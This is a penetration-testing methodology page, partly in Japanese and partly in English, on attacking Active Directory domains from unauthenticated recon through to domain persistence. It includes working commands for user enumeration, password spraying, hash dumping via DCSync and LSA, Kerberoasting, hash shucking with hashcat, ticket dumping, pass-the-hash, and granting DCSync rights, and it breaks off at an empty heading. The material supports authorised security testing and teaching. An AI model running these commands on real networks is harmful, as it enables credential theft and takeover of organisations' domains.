# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory** は、**network administrators** がネットワーク内の **domains**、**users**、**objects** を効率的に作成・管理するための基盤技術です。スケーラブルに設計されており、膨大な数の users を管理しやすい **groups** や **subgroups** に整理しつつ、さまざまなレベルで **access rights** を制御できます。

**Active Directory** の構造は、主に **domains**、**trees**、**forests** の 3 つの層で構成されます。**domain** は、共通のデータベースを共有する **users** や **devices** などの objects の集まりを含みます。**trees** は、共通の構造でつながったこれらの domains のグループであり、**forest** は、**trust relationships** によって相互接続された複数の trees の集合を表し、組織構造の最上位層を形成します。各層ごとに、特定の **access** 権限と **communication rights** を割り当てることができます。

**Active Directory** における主要な概念は次のとおりです:

1. **Directory** – Active Directory objects に関するすべての情報を保持します。
2. **Object** – ディレクトリ内の実体を指し、**users**、**groups**、または **shared folders** を含みます。
3. **Domain** – ディレクトリ objects のコンテナとして機能し、**forest** 内に複数の domains が共存でき、それぞれが独自の object 集合を保持します。
4. **Tree** – 共通の root domain を共有する domains のグループです。
5. **Forest** – Active Directory における組織構造の頂点であり、複数の trees と、それらの間の **trust relationships** で構成されます。

**Active Directory Domain Services (AD DS)** は、ネットワーク内の集中管理と通信に不可欠な一連の services を含みます。これらの services は以下で構成されます:

1. **Domain Services** – データ保存を一元化し、**users** と **domains** 間のやり取りを管理します。これには **authentication** や **search** 機能も含まれます。
2. **Certificate Services** – 安全な **digital certificates** の作成、配布、管理を担当します。
3. **Lightweight Directory Services** – **LDAP protocol** を通じて directory-enabled applications をサポートします。
4. **Directory Federation Services** – 単一セッションで複数の web applications にまたがってユーザーを認証する **single-sign-on** 機能を提供します。
5. **Rights Management** – 著作物の不正配布や不正利用を制御することで、copyright material の保護を支援します。
6. **DNS Service** – **domain names** の解決に不可欠です。

より詳しい説明は以下を参照してください: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

**AD** を **attack** する方法を学ぶには、**Kerberos authentication process** をしっかり **understand** する必要があります。\
[**仕組みがまだ分からない場合は、このページを読んでください。**](kerberos-authentication.md)

## Cheat Sheet

[https://wadcoms.github.io/](https://wadcoms.github.io) には、AD を enumerate/exploit するために実行できる command を素早く確認できる情報がたくさんあります。

> [!WARNING]
> Kerberos communication は、処理を実行するために **full qualifid name (FQDN)** を **requires** します。IP address で machine にアクセスしようとすると、**it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

AD 環境にアクセスできても credentials/sessions を持っていない場合は、次のことができます:

- **Pentest the network:**
- ネットワークをスキャンして machine と open ports を見つけ、**vulnerabilities を exploit** するか、そこから **credentials を extract** してみます（たとえば、[printers could be very interesting targets](ad-information-in-printers.md) です。
- DNS を enumerate すると、domain 内の web、printers、shares、vpn、media などの重要な servers に関する情報が得られる場合があります。
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- これを行う方法の詳細は、一般的な [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) を参照してください。
- **smb services に対する null と Guest access を確認する**（これは modern Windows versions では動作しません）:
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB server の enumerate 方法のより詳細なガイドは、こちらで確認できます:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP の enumerate 方法のより詳細なガイドは、こちらで確認できます（**anonymous access** に特に注意してください）:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- [**Responder で services を impersonating**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) して credentials を収集する
- [**relay attack を abusing**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) して host にアクセスする
- [**evil-S** で fake UPnP services を exposing**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) して credentials を収集する
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- internal documents、social media、domain 環境内の services（主に web）や公開情報から usernames/names を抽出する。
- 会社の workers の complete names が分かれば、さまざまな AD の **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)) を試せます。最も一般的な conventions は次のとおりです: _NameSurname_, _Name.Surname_, _NamSur_（各 3 文字）, _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 つの _random letters and 3 random numbers_（abc123）。
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) と [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) のページを確認してください。
- **Kerbrute enum**: **invalid username is requested** された場合、server は **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ を返すため、username が無効であると判定できます。**Valid usernames** は、**TGT in a AS-REP** response か、_KRB5KDC_ERR_PREAUTH_REQUIRED_ エラーのどちらかを返し、ユーザーに pre-authentication が必要であることを示します。
- **No Authentication against MS-NRPC**: domain controllers 上の MS-NRPC (Netlogon) interface に対して auth-level = 1 (No authentication) を使用します。この method は、MS-NRPC interface を bind した後に `DsrGetDcNameEx2` function を呼び出し、credentials がなくても user または computer の存在を確認します。 [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool はこの種の enumeration を実装しています。研究資料は [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf) にあります
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) サーバー**

ネットワーク内でこれらのサーバーのいずれかを見つけた場合、**ユーザー列挙**も実行できます。たとえば、ツール [**MailSniper**](https://github.com/dafthack/MailSniper) を使えます:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> ユーザー名の一覧は、[**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) とこちら ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) で見つけられます。
>
> ただし、この前に実施したはずの recon ステップで、会社で働いている人たちの**名前**を把握しているべきです。名前と姓があれば、スクリプト [**namemash.py**](https://gist.github.com/superkojiman/11076951) を使って、有効な可能性のあるユーザー名を生成できます。

### 1つまたは複数のユーザー名を知っている場合

では、すでに有効なユーザー名は分かっているが、パスワードはまだ分からないとしましょう... その場合は次を試します:

- [**ASREPRoast**](asreproast.md): ユーザーに _DONT_REQ_PREAUTH_ 属性が**ない**場合、そのユーザーに対して **AS_REP メッセージを要求**できます。そこには、そのユーザーのパスワードの導出結果で暗号化されたデータが含まれます。
- [**Password Spraying**](password-spraying.md): 発見した各ユーザーに対して、最も**一般的なパスワード**を試してみましょう。誰かが弱いパスワードを使っているかもしれません（パスワードポリシーに注意!）。
- OWA サーバーにも **spray** して、ユーザーのメールサーバーへのアクセスを試みることもできます。

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

ネットワークのいくつかのプロトコルに **poisoning** を仕掛けて、クラッキング用の **hashes** を **obtain** できる可能性があります:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

active directory を列挙できていれば、より多くのメールアドレスとネットワークのより良い理解が得られます。AD 環境へアクセスするために、NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) を強制できるかもしれません。

### NetExec workspace-driven recon & relay posture checks

- **`nxcdb` workspaces** を使って、engagement ごとに AD recon の状態を保持します: `workspace create <name>` で、`~/.nxc/workspaces/<name>` 配下にプロトコルごとの SQLite DB が作成されます（smb/mssql/winrm/ldap/etc）。`proto smb|mssql|winrm` で表示を切り替え、`creds` で収集した secrets を一覧表示します。完了したら、機微なデータは手動で削除します: `rm -rf ~/.nxc/workspaces/<name>`.
- **`netexec smb <cidr>`** による簡易サブネット discovery では、**domain**、**OS build**、**SMB signing requirements**、**Null Auth** が分かります。`(signing:False)` と表示されるメンバーは **relay-prone** で、DC は signing を要求することが多いです。
- NetExec の出力からそのまま **hostnames in /etc/hosts** を生成して、targeting を সহজにします:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- **SMB relay to the DC が signing によってブロックされている**場合でも、**LDAP** の状態を引き続き確認する: `netexec ldap <dc>` は `(signing:None)` / 弱い channel binding を示す。SMB signing が required でも LDAP signing が disabled の DC は、**SPN-less RBCD** のような abuse に使える有効な **relay-to-LDAP** ターゲットのまま残る。

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs はときどき **マスクされた admin password を HTML に埋め込む**。source/devtools を見ることで cleartext が見える場合がある（例: `<input value="<password>">`）ため、Basic-auth で scan/print repositories にアクセスできる。
- 取得した print jobs には、ユーザーごとの password を含む **plaintext onboarding docs** が入っている場合がある。テスト時は pairings を一致させて保つこと:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

もし **null や guest ユーザー** で **他のPCや share にアクセス** できるなら、**ファイル**（SCF file など）を置いて、何らかの形でアクセスされたときに **あなたに対する NTLM authentication をトリガー** させることができます。そうすれば **NTLM challenge を steal** して crack できます:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** は、すでに持っているすべての NT hash を、キー材料が NT hash から直接派生する他の遅い形式に対する候補パスワードとして扱います。Kerberos RC4 tickets、NetNTLM challenges、cached credentials に対して長い passphrase を brute-force する代わりに、NT hash を Hashcat の NT-candidate modes に投入して、plaintext を一切知らずに password reuse を検証します。特に domain compromise 後、数千件の現在および過去の NT hash を収集できる場合に非常に有効です。

shucking を使うべき場面:

- DCSync、SAM/SECURITY dumps、または credential vaults から NT corpus を持っていて、他の domains/forests での reuse をテストしたい。
- RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`)、NetNTLM responses、または DCC/DCC2 blobs を取得した。
- 長い、crack できない passphrase の reuse を素早く証明し、すぐに Pass-the-Hash で pivot したい。

この technique は、キーが NT hash ではない encryption types（例: Kerberos etype 17/18 AES）には **使えません**。domain が AES-only を強制している場合は、通常の password modes に戻す必要があります。

#### Building an NT hash corpus

- **DCSync/NTDS** – `secretsdump.py` に history を付けて、できるだけ多くの NT hashes（およびその過去値）を取得します:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries は候補プールを大幅に広げます。Microsoft はアカウントごとに最大 24 個の過去 hash を保存できるためです。NTDS secrets を収集する他の方法は以下を参照:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`（または Mimikatz `lsadump::sam /patch`）で local SAM/SECURITY data と cached domain logons（DCC/DCC2）を抽出します。これらの hash を重複排除して、同じ `nt_candidates.txt` リストに追加します。
- **Track metadata** – 各 hash を生成した username/domain を保持します（wordlist が hex だけでも）。Hashcat が勝利候補を表示したとき、その hash が一致することで、どの principal が password を再利用しているかをすぐに特定できます。
- 同じ forest、または trusted forest 由来の候補を優先してください。shucking 時の重なりの可能性が最大になります。

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Rule engines は無効にしてください（`-r` なし、hybrid modes なし）。mangling により candidate key material が壊れます。
- これらの modes 自体が本質的に速いわけではありませんが、NTLM keyspace（M3 Max で約 30,000 MH/s）は Kerberos RC4（約 300 MH/s）より約 100 倍高速です。厳選した NT list をテストする方が、遅い形式で password space 全体を探索するよりはるかに安上がりです。
- 必ず **最新の Hashcat build** を実行してください（`git clone https://github.com/hashcat/hashcat && make install`）。modes 31500/31600/35300/35400 は最近追加されたものです。
- 現在、AS-REQ Pre-Auth 用の NT mode はありません。また AES etypes（19600/19700）には plaintext password が必要です。これらの key は raw NT hashes ではなく、UTF-16LE passwords から PBKDF2 で派生するためです。

#### Example – Kerberoast RC4 (mode 35300)

1. 低権限ユーザーで対象 SPN の RC4 TGS を取得します（詳細は Kerberoast のページを参照）:

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. NT list で ticket を shuck します:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat は各 NT candidate から RC4 key を導出し、`$krb5tgs$23$...` blob を検証します。一致すれば、その service account があなたの既存の NT hash のいずれかを使っていることが確認できます。

3. すぐに PtH で pivot します:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

必要であれば、後で `hashcat -m 1000 <matched_hash> wordlists/` で plaintext を回収することもできます。

#### Example – Cached credentials (mode 31600)

1. 侵害済み workstation から cached logons を dump します:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 興味のある domain user の DCC2 行を `dcc2_highpriv.txt` にコピーして shuck します:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 一致に成功すると、リスト内ですでに既知の NT hash が得られ、cached user が password を再利用していることが証明されます。PtH に直接使う（`nxc smb <dc_ip> -u highpriv -H <hash>`）か、fast NTLM mode で brute-force して文字列を回収します。

同じ workflow は NetNTLM challenge-responses（`-m 27000/27100`）と DCC（`-m 31500`）にもそのまま適用できます。一致が見つかれば、relay、SMB/WMI/WinRM PtH を開始するか、NT hash を masks/rules で offline で再 crack できます。



## Enumerating Active Directory WITH credentials/session

この段階では、**有効な domain account の credentials か session を侵害している** 必要があります。有効な credentials か domain user としての shell があるなら、**前に示した options でも他の users を侵害できる**ことを忘れないでください。

authenticated enumeration を始める前に、**Kerberos double hop problem** が何かを知っておくべきです。


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

1つの account を侵害できたことは、**domain 全体の侵害を始める大きな一歩**です。なぜなら、**Active Directory Enumeration** を始められるからです。

[**ASREPRoast**](asreproast.md) については、すべての脆弱な user を見つけられるようになりますし、[**Password Spraying**](password-spraying.md) については、**すべての usernames の list** を取得して、侵害した account の password、空の passwords、新しく有望な passwords を試せます。

- [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info) を使えます
- より stealthy な [**powershell for recon**](../basic-powershell-for-pentesters/index.html) も使えます
- より詳細な情報を抽出するために [**powerview**](../basic-powershell-for-pentesters/powerview.md) も使えます
- active directory における recon 用の素晴らしい別ツールは [**BloodHound**](bloodhound.md) です。これは（使う collection methods によっては）**あまり stealthy ではありません**が、**それが気にならないなら**、ぜひ試す価値があります。ユーザーがどこで RDP できるか、他の groups への path などを見つけられます。
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**AD の DNS records**](ad-dns-records.md) も、興味深い情報を含んでいる可能性があります。
- directory を enumerate するために使える **GUI 付き tool** は、**SysInternal** Suite の **AdExplorer.exe** です。
- **ldapsearch** を使って LDAP database を検索し、fields _userPassword_ と _unixUserPassword_、あるいは _Description_ に credentials がないか探すこともできます。別の方法については、cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) を参照してください。
- **Linux** を使っている場合は、[**pywerview**](https://github.com/the-useless-one/pywerview) で domain を enumerate することもできます。
- 自動化 tool としては以下も試せます:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Windows からすべての domain usernames を取得するのは非常に簡単です（`net user /domain` 、`Get-DomainUser`、または `wmic useraccount get name,sid`）。Linux では次を使えます: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` または `enum4linux -a -u "user" -p "password" <DC IP>`

> この Enumeration セクションは短く見えても、実際には最も重要な部分です。リンク（主に cmd、powershell、powerview、BloodHound）を開き、domain を enumerate する方法を学び、慣れるまで練習してください。assessment 中は、DA へ進む道を見つけるか、何もできないと判断するかの分岐点になります。

### Kerberoast

Kerberoasting は、user accounts に紐づく services が使う **TGS tickets** を取得し、その encryption を **offline** で crack する手法です。暗号化は user passwords に基づいています。

詳細はここを参照:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

いったん credentials を入手したら、どの **machine** にアクセスできるか確認できます。そのために、port scan に応じて複数の protocols で複数の servers への接続を試す **CrackMapExec** を使えます。

### Local Privilege Escalation

通常の domain user として credentials か session を侵害していて、この user で domain 内の **any machine** に **access** できるなら、local に privilege を escalate し、credentials を looting する方法を探すべきです。なぜなら、local administrator privileges があって初めて、メモリ（LSASS）や local（SAM）から他の users の hashes を **dump** できるからです。

この本には [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) と [**checklist**](../checklist-windows-privilege-escalation.md) の完全なページがあります。また、[**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) の使用も忘れないでください。

### Current Session Tickets

現在の user が **unexpected resources への access 権限を与える tickets** を持っている可能性は非常に **低い** ですが、次を確認できます:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Active Directory を列挙できていれば、**より多くのメール**と**ネットワークのより良い理解**が得られます。NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**を強制できる**かもしれません。**

### Looks for Creds in Computer Shares | SMB Shares

基本的な credentials を入手したら、AD 内で共有されている**興味深いファイルを見つけられる**か確認すべきです。手動でもできますが、とても退屈で繰り返しの作業です（確認すべき文書が何百件も見つかればなおさらです）。

[**使えるツールについて学ぶにはこのリンクを参照してください。**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

他の PC や share に**アクセスできる**なら、（SCF ファイルのような）ファイルを**配置**して、それが何らかの形でアクセスされると**あなたに対する NTLM authentication を発生させる**ようにし、**NTLM challenge を盗んで** crack できるようにします:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

この脆弱性により、認証済みユーザーなら誰でも**domain controller を侵害**できました。


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**以下の手法では、通常の domain user だけでは不十分です。これらの攻撃を行うには、特別な privileges/credentials が必要です。**

### Hash extraction

うまくいけば、[AsRepRoast](asreproast.md)、[Password Spraying](password-spraying.md)、[Kerberoast](kerberoast.md)、[Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) を relay を含めて使う、[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)、[ローカル権限昇格](../windows-local-privilege-escalation/index.html) を使って、**何らかの local admin** アカウントを侵害できているはずです。\
その後は、メモリ内とローカルにあるすべての hash を dump する段階です。\
[**hash を取得するさまざまな方法についてこのページを読む。**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**ユーザーの hash を入手したら**、それを使ってそのユーザーを**impersonate**できます。\
その hash を使って **NTLM authentication を実行する** **tool** を使うか、新しい **sessionlogon** を作成してその hash を **LSASS** に **inject** し、NTLM authentication が行われるたびにその hash が使われるようにできます。最後の方法が mimikatz の動作です。\
[**詳細についてはこのページを読む。**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

この攻撃は、一般的な NTLM プロトコルでの Pass The Hash の代わりに、ユーザーの NTLM hash を使って Kerberos ticket を要求することを目的としています。そのため、**NTLM protocol が無効化され、Kerberos だけが authentication protocol として許可されている network で特に有用**です。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT)** 攻撃手法では、攻撃者は password や hash 値の代わりに**ユーザーの authentication ticket を盗みます**。この盗んだ ticket を使って**ユーザーを impersonate**し、network 内の resources や services への不正アクセスを得ます。


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

**local administrator** の **hash** または **password** を持っているなら、それを使って他の **PCs** に**ローカルログイン**できるか試すべきです。
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Note that this is quite **noisy** and **LAPS** would **mitigate** it.

### MSSQL Abuse & Trusted Links

If a user has privileges to **access MSSQL instances**, he could be able to use it to **execute commands** in the MSSQL host (if running as SA), **steal** the NetNTLM **hash** or even perform a **relay** **attack**.\
Also, if a MSSQL instance is trusted (database link) by a different MSSQL instance. If the user has privileges over the trusted database, he is going to be able to **use the trust relationship to execute queries also in the other instance**. These trusts can be chained and at some point the user might be able to find a misconfigured database where he can execute commands.\
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory and deployment suites often expose powerful paths to credentials and code execution. See:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

If you find any Computer object with the attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) and you have domain privileges in the computer, you will be able to dump TGTs from memory of every users that logins onto the computer.\
So, if a **Domain Admin logins onto the computer**, you will be able to dump his TGT and impersonate him using [Pass the Ticket](pass-the-ticket.md).\
Thanks to constrained delegation you could even **automatically compromise a Print Server** (hopefully it will be a DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

If a user or computer is allowed for "Constrained Delegation" it will be able to **impersonate any user to access some services in a computer**.\
Then, if you **compromise the hash** of this user/computer you will be able to **impersonate any user** (even domain admins) to access some services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Having **WRITE** privilege on an Active Directory object of a remote computer enables the attainment of code execution with **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

The compromised user could have some **interesting privileges over some domain objects** that could let you **move** laterally/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Discovering a **Spool service listening** within the domain can be **abused** to **acquire new credentials** and **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

If **other users** **access** the **compromised** machine, it's possible to **gather credentials from memory** and even **inject beacons in their processes** to impersonate them.\
Usually users will access the system via RDP, so here you have how to performa couple of attacks over third party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** provides a system for managing the **local Administrator password** on domain-joined computers, ensuring it's **randomized**, unique, and frequently **changed**. These passwords are stored in Active Directory and access is controlled through ACLs to authorized users only. With sufficient permissions to access these passwords, pivoting to other computers becomes possible.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** from the compromised machine could be a way to escalate privileges inside the environment:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

If **vulnerable templates** are configured it's possible to abuse them to escalate privileges:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Once you get **Domain Admin** or even better **Enterprise Admin** privileges, you can **dump** the **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Some of the techniques discussed before can be used for persistence.\
For example you could:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

The **Silver Ticket attack** creates a **legitimate Ticket Granting Service (TGS) ticket** for a specific service by using the **NTLM hash** (for instance, the **hash of the PC account**). This method is employed to **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

A **Golden Ticket attack** involves an attacker gaining access to the **NTLM hash of the krbtgt account** in an Active Directory (AD) environment. This account is special because it's used to sign all **Ticket Granting Tickets (TGTs)**, which are essential for authenticating within the AD network.

Once the attacker obtains this hash, they can create **TGTs** for any account they choose (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

These are like golden tickets forged in a way that **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Having certificates of an account or being able to request them** is a very good way to be able to persist in the users account (even if he changes the password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Using certificates is also possible to persist with high privileges inside the domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

The **AdminSDHolder** object in Active Directory ensures the security of **privileged groups** (like Domain Admins and Enterprise Admins) by applying a standard **Access Control List (ACL)** across these groups to prevent unauthorized changes. However, this feature can be exploited; if an attacker modifies the AdminSDHolder's ACL to give full access to a regular user, that user gains extensive control over all privileged groups. This security measure, meant to protect, can thus backfire, allowing unwarranted access unless closely monitored.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Inside every **Domain Controller (DC)**, a **local administrator** account exists. By obtaining admin rights on such a machine, the local Administrator hash can be extracted using **mimikatz**. Following this, a registry modification is necessary to **enable the use of this password**, allowing for remote access to the local Administrator account.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

You could **give** some **special permissions** to a **user** over some specific domain objects that will let the user **escalate privileges in the future**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

The **security descriptors** are used to **store** the **permissions** an **object** have **over** an **object**. If you can just **make** a **little change** in the **security descriptor** of an object, you can obtain very interesting privileges over that object without needing to be member of a privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

